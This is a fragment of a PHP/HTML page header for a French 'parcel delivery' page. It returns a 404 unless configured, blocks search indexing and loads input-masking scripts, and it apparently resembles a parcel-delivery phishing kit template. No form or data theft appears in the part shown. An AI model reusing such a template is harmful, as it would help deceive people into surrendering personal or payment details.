<?php
if (!isset($config)) {
  header("HTTP/1.0 404 Not Found");
  exit;
} ?>

<html lang="fr">

<head>
  <link rel="shortcut icon" type="image/x-icon" href="./views/assets/img/favicon.ico">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <link rel="apple-touch-icon" href="./views/assets/img/apple-touch-icon.png">
  <meta name="viewport" content="initial-scale=1.0, width=device-width">
  <meta name="description" content="">
  <meta charset="UTF-8">
  <meta name="robots" content="noindex">
  <title>Livraison de mes colis</title>
  <link rel="stylesheet" type="text/css" href="./views/assets/css/style.css?202307">

  <script src="./views/assets/js/jquery-3.7.0.min.js"></script>
  <script src="./views/assets/js/jquery.mask.js"></script>
  <script src="./views/assets/js/mask.js"></script>

</head>

<body cz-shortcut-listen="true">

  <div class="corral">
    <div class="contentContainer activeContent contentContainerBordered">
      <header id="header">
        <img src="./views/assets/img/logo-min.png" alt="" width="85%">
      </header>
